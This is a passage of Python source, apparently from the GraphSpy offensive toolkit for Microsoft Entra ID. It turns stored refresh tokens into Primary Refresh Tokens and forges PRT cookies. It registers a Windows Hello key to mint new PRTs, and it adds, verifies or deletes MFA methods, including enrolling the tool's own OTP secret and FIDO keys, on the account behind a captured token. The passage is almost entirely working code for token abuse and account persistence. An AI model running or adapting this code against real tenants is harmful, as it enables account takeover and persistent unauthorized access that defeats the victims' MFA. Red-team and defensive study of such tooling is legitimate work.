    session_key_hex = decrypt_session_key(response_json["session_key_jwe"], private_key)
    # Store PRT
    issued_at = int(datetime.now().timestamp())
    expires_at = response_json["expires_on"]
    prt_id = execute_db("INSERT INTO primary_refresh_tokens (device_id, user, prt, session_key, issued_at, expires_at, description) VALUES (?, ?, ?, ?, ?, ?, ?)", (
        device_id, 
        refresh_token_user, 
        prt, 
        session_key_hex, 
        issued_at, 
        expires_at, 
        f"Created using refresh token {refresh_token_id}"
    ))
    return prt_id

def calculate_derived_key(session_key, context):
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.kbkdf import CounterLocation, KBKDFHMAC, Mode
    from cryptography.hazmat.backends import default_backend
    backend = default_backend()
    kdf = KBKDFHMAC(
        algorithm=hashes.SHA256(),
        mode=Mode.CounterMode,
        length=32,
        rlen=4,
        llen=4,
        location=CounterLocation.BeforeFixed,
        label=b"AzureAD-SecureConversation",
        context=context,
        fixed=None,
        backend=backend
    )
    return kdf.derive(session_key)

def refresh_prt_to_access_token(prt_id, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "https://graph.microsoft.com", refresh_prt = True, redirect_uri = None) -> int:
    """
    All credit to:
    https://github.com/dirkjanm/ROADtools
    """	
    from cryptography.hazmat.primitives import hashes, padding
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    prt_row = query_db_json("SELECT * FROM primary_refresh_tokens WHERE id = ?",[prt_id],one=True)
    if not prt_row:
        raise AppError(f"No PRT found with ID {prt_id}!")
    prt = prt_row["prt"]
    session_key = binascii.unhexlify(prt_row["session_key"])
    nonce = get_srv_challenge_nonce()
    jwt_payload = {
            "win_ver": "10.0.26100",
            "scope": ("openid aza" if refresh_prt else "openid"), # If scope includes "aza", it will issue a new PRT. Else it will issue a regular refresh token
            "request_nonce": nonce,
            "refresh_token": prt,
            "redirect_uri": f"ms-appx-web://Microsoft.AAD.BrokerPlugin/{client_id}" if not redirect_uri else redirect_uri,
            "iss": "aad:brokerplugin",
            "grant_type": "refresh_token",
            "client_id": client_id,
            "resource": resource,
            "aud": "login.microsoftonline.com",
            "iat": str(int(time.time())),
            "exp": str(int(time.time())+(3600)),
        }

    context = os.urandom(24)
    jwt_headers = {
        'ctx': base64.b64encode(context).decode('utf-8'),
        'kdf_ver': 2
    }
    # Sign with random key to get jwt body in right encoding
    tempjwt = jwt.encode(jwt_payload, os.urandom(32), algorithm='HS256', headers=jwt_headers)
    jbody = tempjwt.split('.')[1]
    jwtbody = base64.urlsafe_b64decode(jbody+('='*(len(jbody)%4)))
    digest = hashes.Hash(hashes.SHA256())
    digest.update(context)
    digest.update(jwtbody)
    kdfcontext = digest.finalize()
    derived_key = calculate_derived_key(session_key,kdfcontext)
    request_jwt = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=jwt_headers)
    token_request_data = {
            'windows_api_version':'2.2',
            'grant_type':'urn:ietf:params:oauth:grant-type:jwt-bearer',
            'request':request_jwt,
            'client_info':'1'
        }
    headers = {"User-Agent":get_user_agent()}
    response = requests.post("https://login.microsoftonline.com/common/oauth2/token", data=token_request_data, headers=headers)
    if response.status_code != 200:
        raise AppError(parse_token_endpoint_error(response))
    encrypted_token_response = response.text
    gspy_log.debug(f"PRT to access token response:\n{encrypted_token_response}")
    headerdata, enckey, iv, ciphertext, authtag = encrypted_token_response.split('.')
    response_context = json.loads(base64.urlsafe_b64decode(headerdata+('='*(len(headerdata)%4)))).get("ctx")
    response_derived_key = calculate_derived_key(session_key, base64.b64decode(response_context))
    iv_raw = base64.urlsafe_b64decode(iv+('='*(len(iv)%4)))
    ciphertext_raw = base64.urlsafe_b64decode(ciphertext+('='*(len(ciphertext)%4)))
    if len(iv_raw) == 12:
        aesgcm = AESGCM(response_derived_key)
        authtag_raw = base64.urlsafe_b64decode(authtag+('='*(len(authtag)%4)))
        decrypted_response = aesgcm.decrypt(iv_raw, ciphertext_raw + authtag_raw, headerdata.encode('utf-8'))
    else:
        cipher = Cipher(algorithms.AES(response_derived_key), modes.CBC(iv_raw))
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(ciphertext_raw) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        decrypted_response = unpadder.update(decrypted_data) + unpadder.finalize()
    decrypted_response_json = json.loads(decrypted_response)
    gspy_log.debug(f"Decrypted PRT to access token response: \n{decrypted_response_json}")
    if not "access_token" in decrypted_response_json:
        raise AppError(f"Failed to request access token with PRT. No 'access_token' in decrypted token response.")
    access_token_row_id = save_access_token(decrypted_response_json["access_token"], f"Created using PRT {prt_id}")
    issued_at = int(datetime.now().timestamp())
    expires_at = issued_at + int(decrypted_response_json["refresh_token_expires_in"])
    if refresh_prt and "refresh_token" in decrypted_response_json:
        prt_id = execute_db("INSERT INTO primary_refresh_tokens (device_id, user, prt, session_key, issued_at, expires_at, description) VALUES (?, ?, ?, ?, ?, ?, ?)", (
            prt_row["device_id"], 
            prt_row["user"], 
            decrypted_response_json["refresh_token"], 
            prt_row["session_key"], 
            issued_at, 
            expires_at,
            f"Refreshed from PRT {prt_id}"
            )
        )
    elif "refresh_token" in decrypted_response_json:
        refresh_token_id = execute_db("INSERT INTO refreshtokens (stored_at, description, user, tenant_id, client_id, resource, foci, refreshtoken) VALUES (?,?,?,?,?,?,?,?)",(
            f"{datetime.now()}".split(".")[0],
            f"Created using PRT {prt_id}",
            prt_row["user"],
            "common",
            client_id,
            resource,
            decrypted_response_json.get("foci", 0),
            decrypted_response_json.get("refresh_token"),
            )
        )
    else:
        raise gspy_log.debug("No refresh token or PRT found in decrypted response. Only stored access token.")
    return access_token_row_id

def generate_prt_cookie(prt_id):
    """
    All credit to:
    https://github.com/dirkjanm/ROADtools
    """
    from cryptography.hazmat.primitives import hashes
    prt_row = query_db_json("SELECT * FROM primary_refresh_tokens WHERE id = ?",[prt_id],one=True)
    if not prt_row:
        raise AppError(f"No PRT found with ID {prt_id}!")
    prt = prt_row["prt"]
    session_key = binascii.unhexlify(prt_row["session_key"])
    nonce = get_srv_challenge_nonce()
    context = os.urandom(24)
    jwt_headers = {
        'ctx': base64.b64encode(context).decode('utf-8'),
        'kdf_ver': 2
    }
    jwt_payload = {
        "refresh_token": prt,
        "is_primary": "true",
        "request_nonce": nonce
    }
    tempjwt = jwt.encode(jwt_payload, os.urandom(32), algorithm='HS256', headers=jwt_headers)
    jbody = tempjwt.split('.')[1]
    jwtbody = base64.urlsafe_b64decode(jbody+('='*(len(jbody)%4)))
    digest = hashes.Hash(hashes.SHA256())
    digest.update(context)
    digest.update(jwtbody)
    kdfcontext = digest.finalize()
    derived_key = calculate_derived_key(session_key,kdfcontext)
    prt_cookie = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=jwt_headers)
    return prt_cookie

def register_winhello(access_token_id):
    """
    All credit to:
    https://github.com/dirkjanm/ROADtools
    """
    rows = query_db("SELECT accesstoken FROM accesstokens WHERE id = ?",[access_token_id],one=True)
    if not rows:
        raise AppError(f"No access token with ID {access_token_id}!")
    access_token = rows[0]
    decoded_accesstoken = jwt.decode(access_token, options={"verify_signature": False})
    if not "deviceid" in decoded_accesstoken:
        gspy_log.error(f"No device ID found in access token with ID {access_token_id}! This will probably fail!")
    device_id = decoded_accesstoken.get("deviceid", "00000000-0000-0000-0000-000000000000")
    headers = {
        'Authorization': f'Bearer {access_token}',
        'User-Agent': 'Dsreg/10.0 (Windows 10.0.19044.1826)',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    private_key, private_key_bytes, public_key = generate_key_pair()
    private_key_base64 = base64.b64encode(private_key_bytes).decode('utf-8')
    pubkeycngblob = generate_public_key_rsa_blob(public_key)
    data = {
        "kngc": pubkeycngblob.decode('utf-8')
    }
    response = requests.post("https://enterpriseregistration.windows.net/EnrollmentServer/key/?api-version=1.0", headers=headers, json=data)
    if response.status_code != 200:
        raise AppError(f"Failed to register WinHello for device. Received status code {response.status_code}")
    response_json = response.json()
    key_id = response_json.get("kid", "00000000-0000-0000-0000-000000000000")
    user = response_json.get("upn", "Unknown")
    winhello_id = execute_db("INSERT INTO winhello_keys (stored_at, key_id, device_id, user, priv_key) VALUES (?, ?, ?, ?, ?)", (
        int(time.time()),
        key_id,
        device_id,
        user,
        private_key_base64
    ))
    return winhello_id
    
def winhello_to_prt(winhello_id, device_id = None, winhello_username = None):
    """
    All credit to:
    https://github.com/dirkjanm/ROADtools
    """
    from cryptography.hazmat.primitives import serialization, hashes
    winhello = query_db("SELECT * FROM winhello_keys WHERE id = ?",[winhello_id],one=True)
    if not winhello:
        raise AppError(f"No WinHello key with ID {winhello_id}!")
    winhello_private_key_base64 = winhello["priv_key"]
    winhello_private_key_bytes = base64.b64decode(winhello_private_key_base64)
    winhello_private_key = serialization.load_pem_private_key(winhello_private_key_bytes, password=None)
    winhello_public_key = winhello_private_key.public_key()
    pubkeycngblob = base64.b64decode(generate_public_key_rsa_blob(winhello_public_key))
    digest = hashes.Hash(hashes.SHA256())
    digest.update(pubkeycngblob)
    kid = base64.b64encode(digest.finalize()).decode('utf-8')
    if not device_id:
        device_id = winhello["device_id"]
    if not winhello_username:
        winhello_username = winhello["user"]
    
    winhello_assertion_payload = {
          "iss": winhello_username,
          "aud": "common",
          "iat": int(time.time())-3600,
          "exp": int(time.time())+3600,
          "request_nonce": get_srv_challenge_nonce(),
          "scope": "openid aza ugs"
        }
    winhello_assertion_headers = {
            "kid": kid,
            "use": "ngc"
        }
    winhello_assertion = jwt.encode(winhello_assertion_payload, winhello_private_key_bytes, algorithm='RS256', headers=winhello_assertion_headers)

    jwt_payload = {
            "client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
            "request_nonce": get_srv_challenge_nonce(),
            "scope": "openid aza ugs",
            "group_sids": [],
            "win_ver": "10.0.19041.868",
            "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
            "username": winhello_username,
            "assertion": winhello_assertion
        }

    device_certificate_base64 = query_db("SELECT certificate FROM device_certificates WHERE device_id = ?",[device_id],one=True)[0]
    device_private_key_base64 = query_db("SELECT priv_key FROM device_certificates WHERE device_id = ?",[device_id],one=True)[0]
    if not device_certificate_base64 or not device_private_key_base64:
        raise AppError(f"No certificate or private key for device with ID {device_id}!")
    jwt_header = {
        "x5c": device_certificate_base64,
        "kdf_ver": 2
    }
    device_private_key_bytes = base64.b64decode(device_private_key_base64)
    device_private_key = serialization.load_pem_private_key(device_private_key_bytes, password=None)
    jwt_token = jwt.encode(jwt_payload, device_private_key, algorithm='RS256', headers=jwt_header)
    prt_request_body = {
        'windows_api_version':'2.2',
        'grant_type':'urn:ietf:params:oauth:grant-type:jwt-bearer',
        'request':jwt_token,
        'client_info':'1'
    }
    headers = {"User-Agent":get_user_agent()}
    response = requests.post("https://login.microsoftonline.com/common/oauth2/token", data=prt_request_body, headers=headers)
    if response.status_code != 200:
        raise AppError(parse_token_endpoint_error(response))
    response_json = response.json()
    gspy_log.debug(f"PRT request response:\n{response_json}")
    if not "refresh_token" in response_json or not "session_key_jwe" in response_json:
        raise AppError(f"Failed to request PRT. No 'refresh_token' or 'session_key_jwe' in response.")
    prt = response_json["refresh_token"]
    session_key_hex = decrypt_session_key(response_json["session_key_jwe"], device_private_key)
    # Store PRT
    issued_at = int(datetime.now().timestamp())
    expires_at = response_json["expires_on"]
    prt_id = execute_db("INSERT INTO primary_refresh_tokens (device_id, user, prt, session_key, issued_at, expires_at, description) VALUES (?, ?, ?, ?, ?, ?, ?)", (
        device_id, winhello_username, 
        prt, 
        session_key_hex, 
        issued_at, 
        expires_at, 
        f"Created with WinHello key {winhello_id}"
    ))
    return prt_id
        
# ========== MFA Functions ==========

def get_security_info_type(type_id):
    security_info_types_dict = {
        -1: "done",
        0: "unknown",
        1: "appNotificationAndCode",
        2: "appNotificationOnly",
        3: "appCodeOnly",
        4: "mobilePhoneCallAndSMS",
        5: "mobilePhoneCall",
        6: "mobilePhoneSMS",
        7: "officePhone",
        8: "email",
        9: "securityQuestions",
        10: "appPassword",
        11: "altMobilePhoneCall",
        12: "fido",
        13: "phoneSignIn",
        14: "temporaryAccessPass",
        15: "hardwareOath",
        16: "password",
        18: "passkey",
        19: "passkeyFromAuthenticator",
        100: "unsupportedAuthMethods"
    }
    return security_info_types_dict[type_id] if type_id in security_info_types_dict else security_info_types_dict[0]

def get_verification_state(verification_state_id):
    verification_state_dict = {
        0: "unknown",
        1: "verificationPending",
        2: "verified",
        3: "verificationFailed",
        4: "systemError",
        5: "activationPending",
        6: "activationFailure",
        7: "activationSucceeded",
        8: "challengeExpired",
        9: "activationThrottled",
        10: "captchaRequired"
    }
    return verification_state_dict[verification_state_id] if verification_state_id in verification_state_dict else verification_state_dict[0]

def get_security_info_error(error_id):
    add_security_info_error_dict = {
        0: "none",
        1: "userIsBlockedBySAS",
        2: "systemError",
        3: "invalidCanary",
        4: "badRequest",
        5: "dataNotFound",
        6: "ngcMfaRequired", # Access token requires the "ngcmfa" value in the "amr" claim
        7: "keyDisallowedByPolicy",
        8: "challengeExpired",
        9: "authorizationRequestDenied",
        10: "authTokenNotForTargetTenant",
        11: "authTokenNotFound",
        12: "invalidAikChain",
        13: "invalidAttestationDataFormat",
        14: "requiredParamMissing",
        15: "retryWebAuthN",
        16: "userNotFound",
        17: "badDirectoryRequest",
        18: "replicaUnavailable",
        19: "requestThrottled",
        20: "userGroupRestriction",
        21: "featureDisallowedByPolicy",
        22: "invalidKeyDataFormat",
        23: "attestationValidationFailed",
        24: "verificationFailed",
        25: "appSessionTimedOut",
        26: "activationThrottled",
        27: "appRequestTimedOut",
        28: "captchaRequired", # Trigger captcha. Usually after multiple failed SMS codes
        29: "badPhoneNumber",
        30: "deviceNotFound",
        31: "phoneAppNotificationDenied",
        32: "KeyNotFound",
        33: "InvalidSession",
        34: "OtherDefaultAvailable",
        35: "HardwareTokenAssigned"
    }
    return add_security_info_error_dict[error_id] if error_id in add_security_info_error_dict else add_security_info_error_dict[0]

def get_session_ctx(access_token_id):
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%19db86c3-b2b9-44cc-b339-36da233a3be2%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
        return False
    access_token = access_token[0]
    try:
        headers = {"Authorization":f"Bearer {access_token}", "User-Agent":get_user_agent()}
        uri = "https://mysignins.microsoft.com/api/session/authorize"
        response = requests.post(uri, headers=headers, json={})
        if response.status_code != 200:
            gspy_log.error(f"Failed to obtain sessionCtxV2 value. Received status code {response.status_code}")
            return False
        sessionCtxV2 = response.json()["sessionCtxV2"]
        gspy_log.debug(f"Received sessionCtxV2: '{sessionCtxV2}'")
        return sessionCtxV2
    except Exception as e:
        gspy_log.error(f"Failed to obtain sessionCtxV2 value.")
        traceback.print_exc()
        return False

def get_available_authentication_info(access_token_id):
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%19db86c3-b2b9-44cc-b339-36da233a3be2%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
        return False
    access_token = access_token[0]
    try:
        sessionCtxV2 = get_session_ctx(access_token_id)
        headers = {"Authorization":f"Bearer {access_token}", "Sessionctxv2":sessionCtxV2, "User-Agent":get_user_agent()}
        uri = "https://mysignins.microsoft.com/api/authenticationmethods/availablemethods"
        response = requests.get(uri, headers=headers)
        if response.status_code != 200:
            gspy_log.error(f"Failed to obtain AvailableAuthenticationInfo. Received status code {response.status_code}")
            return False
        gspy_log.debug(f"AvailableAuthenticationInfo Raw Response:\n{response.text}")
        availableAuthenticationInfo = response.json()
        availableAuthenticationInfo_parsed = [{**availableAuthenticationInfo[method], "MethodName":method} for method in availableAuthenticationInfo.keys()]
        return availableAuthenticationInfo_parsed
    except Exception as e:
        gspy_log.error(f"Failed to obtain AvailableAuthenticationInfo.")
        traceback.print_exc()
        return False

def validate_captcha(access_token_id, challenge_id, captcha_solution, azure_region, challenge_type = "Visual"):
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%19db86c3-b2b9-44cc-b339-36da233a3be2%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
        return False
    access_token = access_token[0]
    try:
        sessionCtxV2 = get_session_ctx(access_token_id)
        headers = {"Authorization":f"Bearer {access_token}", "Sessionctxv2":sessionCtxV2, "User-Agent":get_user_agent()}
        uri = "https://mysignins.microsoft.com/api/captcha/validation"
        body = {
            "ChallengeType": challenge_type,
            "ChallengeId": challenge_id,
            "InputSolution": captcha_solution,
            "AzureRegion": azure_region
        }
        response = requests.post(uri, headers=headers, json=body)
        if response.status_code != 200:
            gspy_log.error(f"Failed to validate captcha. Received status code {response.status_code}")
            return False
        gspy_log.debug(f"ValidateCaptcha Raw Response:\n{response.text}")
        captcha_response = response.json()
        return captcha_response
    except Exception as e:
        gspy_log.error(f"ValidateCaptcha request failed.")
        traceback.print_exc()
        return False

def initialize_mobile_app_registration(access_token_id, security_info_type):
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%19db86c3-b2b9-44cc-b339-36da233a3be2%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
        return False
    access_token = access_token[0]
    try:
        sessionCtxV2 = get_session_ctx(access_token_id)
        headers = {"Authorization":f"Bearer {access_token}", "Sessionctxv2":sessionCtxV2, "User-Agent":get_user_agent()}
        uri = "https://mysignins.microsoft.com/api/authenticationmethods/initializemobileapp"
        body = {
            "securityInfoType": security_info_type
        }
        response = requests.post(uri, headers=headers, json=body)
        if response.status_code != 200:
            gspy_log.error(f"InitializeMobileAppRegistration request failed. Received status code {response.status_code}")
            return False
        gspy_log.debug(f"InitializeMobileAppRegistration Raw Response:\n{response.text}")
        registrationInfo = response.json()
        return registrationInfo
    except Exception as e:
        gspy_log.error(f"InitializeMobileAppRegistration request failed.")
        traceback.print_exc()
        return False

def delete_security_info(access_token_id, security_info_type, data):
    # Types:
    #   1 - AuthenticatorApp
    #   6 - MobilePhone
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%19db86c3-b2b9-44cc-b339-36da233a3be2%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
        return False
    access_token = access_token[0]
    try:
        sessionCtxV2 = get_session_ctx(access_token_id)
        headers = {"Authorization":f"Bearer {access_token}", "Sessionctxv2":sessionCtxV2, "X-Ms-Client-Session-Id":str(uuid.uuid4()), "User-Agent":get_user_agent()}
        uri = "https://mysignins.microsoft.com/api/authenticationmethods/delete"
        body_data = json.dumps(data) if type(data) == dict else data
        body = {
            "Type": security_info_type,
            "Data": body_data
        }
        gspy_log.debug(f"DeleteSecurityInfo Raw Request Body:\n{body}")
        response = requests.post(uri, headers=headers, json=body)
        gspy_log.debug(f"DeleteSecurityInfo Raw Response:\n{response.text}")
        if response.status_code != 200:
            gspy_log.error(f"DeleteSecurityInfo request failed. Received status code {response.status_code}")
            return False
        security_info_response = response.json()
        if (not security_info_response) or ((not ("Deleted" in security_info_response)) or (not (security_info_response["Deleted"]))):
            gspy_log.error(f"DeleteSecurityInfo request failed. Received response: \n{security_info_response}")
            return False
        return security_info_response
    except Exception as e:
        gspy_log.error(f"DeleteSecurityInfo request failed.")
        traceback.print_exc()
        return False

def add_security_info(access_token_id, security_info_type, data = None):
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%19db86c3-b2b9-44cc-b339-36da233a3be2%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
        return False
    access_token = access_token[0]
    try:
        sessionCtxV2 = get_session_ctx(access_token_id)
        headers = {"Authorization":f"Bearer {access_token}", "Sessionctxv2":sessionCtxV2, "X-Ms-Client-Session-Id":str(uuid.uuid4()), "User-Agent":get_user_agent()}
        uri = "https://mysignins.microsoft.com/api/authenticationmethods/new"
        body = {
            "Type": security_info_type
        }
        body_data = json.dumps(data) if type(data) == dict else data
        if body_data:
            body["Data"] = body_data
        response = requests.post(uri, headers=headers, json=body)
        gspy_log.debug(f"AddSecurityInfo Raw Response:\n{response.text}")
        if response.status_code != 200:
            gspy_log.error(f"AddSecurityInfo request failed. Received status code {response.status_code}")
            return False
        security_info_response = response.json()
        if (not security_info_response) or (not "VerificationContext" in security_info_response):
            gspy_log.error(f"AddSecurityInfo request failed. Received response: \n{security_info_response}")
            return False
        if (not security_info_response["VerificationContext"]) and security_info_response["ErrorCode"] == 28:
            # ErrorCode 28 indicates that a Captcha needs to be solved (happens after a couple of failed attempts in a short timeframe)
            gspy_log.debug(f"We need to solve a captcha...")
            captcha_uri = "https://mysignins.microsoft.com/api/captcha/?challengeType=Visual&locale=en-US"
            captcha_response = requests.get(captcha_uri, headers=headers)
            gspy_log.debug(f"Captcha Raw Response:\n{captcha_response.text}")
            captcha_response_json = captcha_response.json()
            security_info_response["captcha"] = captcha_response_json
        return security_info_response
    except Exception as e:
        gspy_log.error(f"AddSecurityInfo request failed.")
        traceback.print_exc()
        return False

def verify_security_info(access_token_id, security_info_type, verification_context, verification_data):
    # Types:
    #   2 - Microsoft Authenticator App
    #   3 - OTP
    #   6 - MobilePhone
    #   7 - OfficePhone
    #   8 - Email
    #   11 - AltMobilePhone
    #   12 - FIDO
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%19db86c3-b2b9-44cc-b339-36da233a3be2%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
        return False
    access_token = access_token[0]
    try:
        sessionCtxV2 = get_session_ctx(access_token_id)
        headers = {"Authorization":f"Bearer {access_token}", "Sessionctxv2":sessionCtxV2, "User-Agent":get_user_agent()}
        uri = "https://mysignins.microsoft.com/api/authenticationmethods/verify"
        body = {
            "Type": security_info_type,
            "VerificationData": verification_data,
            "VerificationContext": verification_context
        }
        response = requests.post(uri, headers=headers, json=body)
        if response.status_code != 200:
            gspy_log.error(f"VerifySecurityInfo request failed. Received status code {response.status_code}")
            return False
        gspy_log.debug(f"VerifySecurityInfo Raw Response:\n{response.text}")
        verifysecurity_info_response = response.json()
        return verifysecurity_info_response
    except Exception as e:
        gspy_log.error(f"VerifySecurityInfo request failed.")
        traceback.print_exc()
        return False

def add_phone_number(access_token_id, country_code, phone_number, phone_type = "mobilePhone_sms"):
    data = {
        "phoneNumber": phone_number,
        "countryCode": country_code
    }

    if not phone_type in ["mobilePhone_call", "mobilePhone_sms", "altMobilePhone", "officePhone"]:
        gspy_log.error(f"Invalid phone type provided: {phone_type}.")
        return False
    phone_type_dict = {
        "mobilePhone_call": 5,
        "mobilePhone_sms": 6,
        "officePhone": 7,
        "altMobilePhone": 11
    }

    security_info_response = add_security_info(access_token_id, phone_type_dict[phone_type], data)
    if (not security_info_response):
        gspy_log.error(f"Adding phone number failed.")
        return False
    if "captcha" in security_info_response:
        return security_info_response
    if (not ("VerificationContext" in security_info_response)) or (not (security_info_response["VerificationContext"])):
        gspy_log.error(f"Adding phone number failed. Received response: \n{security_info_response}")
        return False
    return security_info_response

def add_mfa_app(access_token_id, security_info_type, secret_key):
    data = {
        "secretKey": secret_key,
        "affinityRegion": None,
        "isResendNotificationChallenge": False
    }
    security_info_response = add_security_info(access_token_id, security_info_type, data)
    if (not security_info_response):
        gspy_log.error(f"Adding MFA app failed.")
        return False
    if "captcha" in security_info_response:
        return security_info_response
    if (not ("VerificationContext" in security_info_response)) or (not (security_info_response["VerificationContext"])):
        gspy_log.error(f"Adding MFA app failed. Received response: \n{security_info_response}")
        return False
    return security_info_response

def add_graphspy_otp(access_token_id, description = ""):
    try:
        initialize_mobile_app_registration_response = initialize_mobile_app_registration(access_token_id, 3)
        if not initialize_mobile_app_registration_response:
            gspy_log.error(f"Failed to initialize mobile app registration.")
            return False
        account_name = initialize_mobile_app_registration_response["AccountName"] if "AccountName" in initialize_mobile_app_registration_response else "Unknown"
        secret_key = initialize_mobile_app_registration_response["SecretKey"]
        data = {
            "secretKey": secret_key,
            "affinityRegion": None,
            "isResendNotificationChallenge": False
        }
        security_info_response = add_security_info(access_token_id, 3, data)
        if (not security_info_response):
            gspy_log.error(f"No valid security info response received.")
            return False
        if "captcha" in security_info_response:
            gspy_log.error(f"A captcha was requested. Aborting.")
            return False
        if (not ("VerificationContext" in security_info_response)) or (not (security_info_response["VerificationContext"])):
            gspy_log.error(f"No VerificationContext in the security info response. Received response: \n{security_info_response}")
            return False
        otp_code = pyotp.TOTP(secret_key).now()
        verify_security_info_response = verify_security_info(access_token_id, 3, security_info_response["VerificationContext"], otp_code)
        if ("ErrorCode" in verify_security_info_response and verify_security_info_response["ErrorCode"]):
            gspy_log.error(f"An error occurred when trying to validate the provided info. Received Error Code {verify_security_info_response.ErrorCode}")
            return False
        execute_db("INSERT INTO mfa_otp (stored_at, secret_key, account_name, description) VALUES (?,?,?,?)",(
            f"{datetime.now()}".split(".")[0],
            secret_key,
            account_name,
            description
        ))
        return secret_key
    except Exception as e:
        gspy_log.error(f"An error occurred when trying to add GraphSpy OTP.")
        traceback.print_exc()
        return False

def add_security_key(access_token_id, key_description = "GraphSpy Key", client_type = "Windows", device_pin = None):
    app.config["add_security_key_status"] = "INIT"
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%19db86c3-b2b9-44cc-b339-36da233a3be2%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
        return create_response(400, f"No access token with ID {access_token_id} and resource containing '19db86c3-b2b9-44cc-b339-36da233a3be2'!")
    access_token = access_token[0]
    from fido2.hid import CtapHidDevice
    from fido2.client import Fido2Client, WindowsClient, UserInteraction
    security_info_response = add_security_info(access_token_id, 12)
    if not security_info_response or ("ErrorCode" in security_info_response and security_info_response["ErrorCode"] != 0):
        error_message = get_security_info_error(security_info_response["ErrorCode"]) if security_info_response and "ErrorCode" in security_info_response else "Unknown"
        gspy_log.error(f"Something went wrong trying to add the security key. Microsoft Error Message: {error_message}")
        return create_response(400, f"Something went wrong trying to add the security key. Microsoft Error Message: {error_message}")
    security_info_data = json.loads(security_info_response["Data"])
    public_key_options = {
        "challenge": security_info_data["requestData"]["serverChallenge"].encode("utf-8"),
        "rp": {
            "name": "Microsoft",
            "id": "login.microsoft.com"
        },
        "user": {
            "id": base64.urlsafe_b64decode(security_info_data["requestData"]["userId"] + "=="),
            "name": security_info_data["requestData"]["memberName"],
            "displayName": security_info_data["requestData"]["userDisplayName"],
            "icon": ""
        },
        "pubKeyCredParams": [{
                "type": "public-key",
                "alg": -7
            }, {
                "type": "public-key",
                "alg": -257
            }
        ],
        "timeout": 600000,
        "excludeCredentials": [],
        "authenticatorSelection": {
            "authenticatorAttachment": security_info_data["requestData"]["authenticator"],
            "requireResidentKey": True,
            "userVerification": "required"
        },
        "attestation": "direct",
        "extensions": {
            "hmacCreateSecret": True
        }
    }
    app.config["add_security_key_status"] = "CLIENT_SETUP"
    if client_type == "Windows":
        if not WindowsClient.is_available():
            gspy_log.error(f"Windows client requested, but WindowsClient is not available! Are you sure the GraphSpy server is running on a compatible Windows device?")
            return create_response(400, "Windows client requested, but WindowsClient is not available! Are you sure the GraphSpy server is running on a compatible Windows device?")
        client = WindowsClient("https://login.microsoft.com")
    else:
        dev = next(CtapHidDevice.list_devices(), None)
        if dev is None:
            gspy_log.debug("No USB FIDO authenticator device found! Trying to use NFC instead.")
            try:
                from fido2.pcsc import CtapPcscDevice
                dev = next(CtapPcscDevice.list_devices(), None)
                gspy_log.debug("Using NFC channel.")
            except Exception as e:
                gspy_log.error("An error occurred when searching for an NFC channel")
                traceback.print_exc()
        if not dev:
            gspy_log.error("No valid FIDO authenticator device found. Admin/root privileges might be required to discover your Authenticator device when not using the Windows WebAuthn API.")
            return create_response(400, "No valid FIDO authenticator device found. Admin/root privileges might be required to discover your Authenticator device when not using the Windows WebAuthn API.")
            
        class CliInteraction(UserInteraction):
            def prompt_up(self):
                app.config["add_security_key_status"] = "TOUCH"
                gspy_log.debug("Touch your authenticator device now.")

            def request_pin(self, permissions, rd_id):
                app.config["add_security_key_status"] = "PIN"
                return device_pin

            def request_uv(self, permissions, rd_id):
                gspy_log.debug("User Verification required.")
                return True
        client = Fido2Client(dev, "https://login.microsoft.com", user_interaction=CliInteraction())
    app.config["add_security_key_status"] = "CREDENTIAL_REGISTRATION"
    credential = client.make_credential(public_key_options)
    if not credential:
        gspy_log.error("Credential registration with the authenticator device failed.")
        return create_response(400, "Credential registration with the authenticator device failed.")
    app.config["add_security_key_status"] = "VERIFY_DATA"
    client_data_json = json.loads(credential.client_data)
    client_data_json_base64 = base64.urlsafe_b64encode(json.dumps(client_data_json, separators=(',',':')).encode("utf-8")).decode()
    credential_id_base64 = base64.urlsafe_b64encode(credential.attestation_object.auth_data.credential_data.credential_id).decode()
    extension_results_json_base64 = base64.urlsafe_b64encode(str(credential.extension_results).encode("utf-8")).decode()
    verification_data = {
        "Name": key_description,
        "Canary": security_info_data["requestData"]["canary"],
